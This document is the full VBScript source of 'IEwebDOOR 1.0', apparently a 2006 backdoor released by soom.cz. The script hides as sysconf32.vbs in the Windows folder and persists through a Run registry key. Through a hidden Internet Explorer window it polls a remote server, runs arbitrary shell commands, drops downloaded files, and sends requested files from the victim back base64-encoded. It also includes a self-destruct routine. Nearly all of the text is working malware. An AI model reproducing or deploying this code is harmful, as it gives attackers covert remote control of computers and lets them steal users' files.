'*******************
'*  IEwebDOOR 1.0  *
'*******************
'*   WWW.SOOM.CZ   *
'*       2006      *
'*    .cCuMiNn.    *
'*******************

strIdentString   = "XXXXXXXXXX"
strPath          = "C:\WINDOWS\"
strPathAlter     = "C:\"
strName          = "sysconf32"

strKlic          = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & strName
Set WshShell     = WScript.CreateObject ("WScript.Shell")
strJmenoSoubor   = WScript.ScriptFullName
strCestaSoubor   = Mid(strJmenoSoubor, 1, InStrRev(strJmenoSoubor, "\"))
strLink          = "http://www.soom.cz/projects/webdoor/enter.php?client=" & strIdentString
strAlphabet      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
Set objProstredi = WshShell.Environment("Process")
strOSNT          = objProstredi("OS")
intWaitMinut     = 10

bStartReg()

bAkce()

Function bAkce()
On Error Resume Next : Err.Clear
  Set objIE = WScript.CreateObject("InternetExplorer.Application")
  Do While true
    objIE.Navigate (strLink)
    objIE.Visible = 0
    If Err.Number <> 0 Then Exit Function
    Do While objIE.Busy
      WScript.Sleep(200)
    Loop
    intWaitMinut  = objIE.Document.form_backdoor.interval.value
    bZobraz       = objIE.Document.form_backdoor.in_hide.checked
    intCekani     = objIE.Document.form_backdoor.in_wait.checked
    strPrikaz     = objIE.Document.form_backdoor.in_command.value
    strDownload   = objIE.Document.form_backdoor.in_download.value
    strUpload     = objIE.Document.form_backdoor.in_upload.value
    If Err.Number <> 0 Then
      Err.Clear
      objIE.Quit
      Exit Function
    End If
    strError = ""
    If (strDownload <> "") And (strOSNT<>"") Then
      strBase64 = objIE.Document.form_backdoor.base64.value
      strBinary = strBase64Decode (strBase64)
      If SaveFile(strCestaSoubor & strDownload, strBinary)= false Then
        strError = strError & "- Sobor (" & strDownload & ") se nepodaøilo nahrát na ovládaný systém!" & vbCrLf
      Else
        strError = strError & "- Sobor (" & strDownload & ") se podaøilo úpì¹nì nahrát na ovládaný systém!" & vbCrLf
      End If
    End If
    objIE.Document.form_backdoor.base64.value = ""
    If bZobraz Then bZobraz = false
    If strPrikaz = "autodestroy" Then
      objIE.Document.form_backdoor.error.value = strAutodestroy()
      objIE.Document.form_backdoor.submit()
      Do While (objIE.Busy)
        WScript.Sleep 200
      Loop
      objIE.Quit
      WScript.Quit
    End If
    If (strPrikaz <> "") Then
      strPrikaz = "%COMSPEC% /c " & """" & strPrikaz & """"
      WshShell.Run strPrikaz, bZobraz, bCekani
    End If
    If (strUpload<>"") And (strOSNT<>"") Then
      Set objFso = WScript.CreateObject ("Scripting.FileSystemObject")
      If objFso.FileExists(strUpload) Then
        strBinary = LoadFile (strUpload)
        If LenB(strBinary)>0 Then
          strData_base64 = strBase64Encode (strBinary)
          objIE.Document.form_backdoor.base64.value = strData_base64
        Else
          objIE.Document.form_backdoor.in_upload.value = ""
          objIE.Document.form_backdoor.base64.value = ""
          strError = strError & "- Vy¾ádaný soubor (" & strUpload & ") se nepodaøilo naèíst!" & vbCrLf
        End If
      Else
        objIE.Document.form_backdoor.in_upload.value = ""
        objIE.Document.form_backdoor.base64.value = ""
        strError = strError & "- Vy¾ádaný soubor (" & strUpload & ") nenalezen!" & vbCrLf
      End If
    End If
    objIE.Document.form_backdoor.error.value = strError
    objIE.Document.form_backdoor.submit()
    Do While (objIE.Busy)
      WScript.Sleep 200
    Loop
    bAkce = true
    For I = 1 To intWaitMinut
      WScript.Sleep(60000)
    Next
  Loop
End Function

function strAutodestroy()
  On Error Resume Next : Err.Clear
  WshShell.RegDelete ("HKLM"+strKlic)
  If Err.Number = 0 Then  
    strError = strError & "- Klient byl úspì¹nì odstranìn z registru." & vbCrLf
  Else
    Err.Clear
    WshShell.RegDelete ("HKCU"+strKlic)
    If Err.Number = 0 Then
      strError = strError & "- Klient byl úspì¹nì odstranìn z registru." & vbCrLf
    Else
      Err.Clear
      strError = strError & "- Klienta se nepodaøilo odstranit z registru." & vbCrLf
    End If
  End If
  Set objFso = WScript.CreateObject ("Scripting.FileSystemObject")
  objFso.DeleteFile strPath & strName & ".vbs", true
  If Err.Number = 0 Then
    strError = strError & "- Klient byl úspì¹nì odstranìn z disku." & vbCrLf
  Else  
    Err.Clear
    objFso.DeleteFile strPathAlter & strName & ".vbs", true
    If Err.Number = 0 Then
      strError = strError & "- Klient byl úspì¹nì odstranìn z disku." & vbCrLf
    Else
      Err.Clear
      strError = strError & "- Klienta se nepodaøilo odstranit z disku." & vbCrLf
    End If
  End If
  strAutodestroy = strError
End Function

Function bStartReg()
  On Error Resume Next : Err.Clear
  if (strCestaSoubor <> strPath) And (strCestaSoubor <> strPathAlter) Then
    Set objFso  = WScript.CreateObject ("Scripting.FileSystemObject")
    Set objFile = objFso.GetFile (strJmenoSoubor)
    strCesta    = strPath & strName & ".vbs"
    objFile.Copy (strCesta)
    If Err.Number <> 0 Then
      Err.Clear
      strCesta  = strPathAlter & strName & ".vbs"
      objFile.Copy (strCesta)
      If Err.Number <> 0 Then
        Err.Clear
        bStartReg = false
        Exit Function
      End If
    End If
    WshShell.RegWrite "HKLM" & strKlic, strCesta, "REG_SZ"
    If Err.Number <> 0 Then
      Err.Clear
      WshShell.RegWrite "HKCU" & strKlic, strCesta, "REG_SZ"
      If Err.Number <> 0 Then
        Err.Clear
        bStartReg = false
        Exit Function
      End If
    End If
    WshShell.Run strCesta, 0, false
    If Err.Number = 0 Then WScript.Quit
  End If
  bStartReg = true
End function

Function strBase64Encode(binString)
On Error Resume Next : Err.Clear
  vystup = ""
  dopln  = ""
  Dim b64znak(4)
  binString = MidB(binString, 1, LenB(binString))
  Do While (LenB(binString) Mod 3)
    binString = binString & ChrB(0)
    dopln = dopln & "="
  Loop
  For i = 1 To LenB(binString) Step 3
    ascZnak1   = MidB(binString, i,   1)
    ascZnak2   = MidB(binString, i+1, 1)
    ascZnak3   = MidB(binString, i+2, 1)
    b64znak(1) = (AscB(ascZnak1)  And 252)/4
    b64znak(2) = ((AscB(ascZnak1) And 3)*16)+((AscB(ascZnak2) And 240)/16)
    b64znak(3) = ((AscB(ascZnak2) And 15)*4 )+((AscB(ascZnak3) And 192)/64)
    b64znak(4) = AscB(ascZnak3)   And 63
    For y = 1 To 4
      vystup   = vystup + Mid(strAlphabet, b64znak(y)+1, 1)
    Next
  Next
  vystup   = Left(vystup, len(vystup)-len(dopln)) & dopln
  If Err.Number = 0 Then
    strBase64Encode = vystup
  Else
    Err.Clear
    strBase64Encode = false
  End If
End Function

Function strBase64Decode (binString)
  On Error Resume Next : Err.Clear
  vystup = ""
  dopln  = ""
  Dim b64znak(4)
  For i = 0 To Len(binString)-2 Step 4
    For y = 1 To 4
       b64znak(y) = InStr(strAlphabet, Mid(binString, i+y, 1))-1
       If b64znak(y) < 0 Then
          i = i + 1
          y = y - 1
       End If
       If b64znak(y) = 64 Then
         i = i + 1
         y = y - 1
         dopln = dopln & "A"
       End If
    Next
    ascZnak1 = (b64znak(1)*4)+((b64znak(2) And 48)/16)
    ascZnak2 = ((b64znak(2) And 15)*16)+((b64znak(3) And 60)/4)
    ascZnak3 = ((b64znak(3) And 3)*64)+b64znak(4)
    vystup   = vystup & Chr(ascZnak1) & Chr(ascZnak2) & Chr(ascZnak3)
  Next
  vystup = Left(vystup, Len(vystup) - Len(dopln))
  If Err.Number = 0 Then
    strBase64Decode = vystup
  Else
    Err.Clear
    strBase64Decode = false
  End If
End Function

Function LoadFile(FileName)
  On Error Resume Next : Err.Clear
  Set objBinaryStream = CreateObject("ADODB.Stream") 
  objBinaryStream.Type = 1 
  objBinaryStream.Open 
  objBinaryStream.LoadFromFile FileName 
  If Err.Number = 0 Then
    LoadFile = objBinaryStream.Read
  Else
    Err.Clear
    LoadFile = false
  End If
End Function 

Function SaveFile (FileName, text)
  On Error Resume Next : Err.Clear
  Set objTextStream     = WScript.CreateObject ("ADODB.Stream")
  objTextStream.type    = 2
  objTextStream.charset = "Windows-1250"
  objTextStream.open()
  objTextStream.WriteText text
  objTextStream.saveToFile FileName, 2
  objTextStream.Close
  If Err.Number = 0 Then
    SaveFile = true
  Else
    Err.Clear
    SaveFile = false
  End If
End Function
